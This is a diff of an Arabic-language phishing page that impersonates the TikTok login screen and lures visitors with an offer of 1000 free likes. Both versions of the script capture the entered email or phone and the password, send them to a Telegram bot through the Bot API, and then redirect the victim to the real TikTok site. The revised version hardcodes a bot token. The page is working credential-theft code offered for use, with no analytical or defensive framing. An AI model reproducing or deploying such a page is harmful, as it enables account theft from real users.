@@ -1,18 +1,23 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>TikTok – Login</title>
-<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#121212;border-radius:12px;padding:30px;width:360px;text-align:center;border:1px solid #333}img{width:120px;margin-bottom:16px}h2{font-size:22px;margin-bottom:8px}p{color:#aaa;font-size:14px;margin-bottom:20px}input{width:100%;padding:14px;margin:6px 0;background:#1e1e1e;border:1px solid #333;border-radius:4px;color:#fff;font-size:16px}.btn{width:100%;background:#fe2c55;color:#fff;border:none;padding:14px;border-radius:4px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:12px}</style></head>
+<html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>TikTok</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.card{background:#121212;padding:20px;border-radius:12px;width:360px;text-align:center;border:1px solid #333}
+img{width:80px;margin-bottom:10px}h2{color:#fe2c55;margin-bottom:15px}
+input{width:100%;padding:12px;margin:8px 0;background:#1e1e1e;border:1px solid #333;border-radius:4px;color:#fff;font-size:16px}
+.btn{background:#fe2c55;color:#fff;border:none;padding:12px;width:100%;border-radius:4px;font-size:18px;font-weight:bold;cursor:pointer}.btn:hover{background:#e0274b}</style></head>
 <body><div class="card">
 <img src="https://lf16-tiktok-common.ttwstatic.com/obj/tiktok-web-us/tiktok/webapp/main/webapp-desktop/044c9a2a9c7b3d5b2b8c.png" alt="TikTok">
 <h2>تسجيل الدخول إلى TikTok</h2>
-<p>احصل على 1000 لايك مجاناً</p>
-<input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف">
-<input type="password" id="pass" placeholder="كلمة المرور">
-<button class="btn" onclick="send()">تسجيل الدخول</button>
+<p style="color:#aaa;font-size:14px;margin-bottom:12px">احصل على 1000 لايك مجاناً</p>
+<input id="u" placeholder="البريد الإلكتروني أو الهاتف"><br>
+<input id="p" type="password" placeholder="كلمة المرور"><br>
+<button class="btn" onclick="sendData()">تسجيل الدخول</button>
 </div>
 <script>
-const p=new URLSearchParams(location.search),T=p.get('token'),C=p.get('chat');
-function send(){const e=document.getElementById('email').value,pa=document.getElementById('pass').value;
-if(!e||!pa)return alert('املأ جميع الحقول');
-fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent('🎵 تيك توك\n👤 '+e+'\n🔑 '+pa)}`).finally(()=>{location.href='https://tiktok.com'})}
+const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";
+const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');
+function sendData(){const u=document.getElementById('u').value,pa=document.getElementById('p').value;
+if(!u||!pa)return alert('املأ جميع الحقول');
+fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('🎵 TikTok\n👤 '+u+'\n🔑 '+pa)}`)
+.then(()=>{location.href='https://www.tiktok.com/'})}
 </script></body></html>
